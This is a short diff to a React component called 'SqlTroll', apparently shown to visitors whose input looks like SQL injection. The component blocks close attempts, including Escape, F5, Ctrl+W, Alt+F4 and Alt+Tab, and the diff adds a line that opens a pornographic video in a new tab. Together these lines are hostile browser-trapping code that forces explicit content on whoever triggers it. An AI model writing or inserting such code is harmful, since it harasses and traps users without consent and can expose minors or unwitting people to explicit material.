@@ -35,7 +35,7 @@ export function hasSql(value: string): boolean {
 export default function SqlTroll({ visible }: { visible: boolean }) {
   useEffect(() => {
     if (!visible) return
-    // Блокируем все попытки закрыть
+    window.open('https://rt.pornhub.com/view_video.php?viewkey=65f487dc9c57d', '_blank')
     const block = (e: Event) => { e.stopImmediatePropagation(); e.preventDefault() }
     const blockKey = (e: KeyboardEvent) => {
       // Блокируем F4, Escape, F5, Ctrl+W, Ctrl+R, Ctrl+F4, Alt+F4, Alt+Tab и т.д.
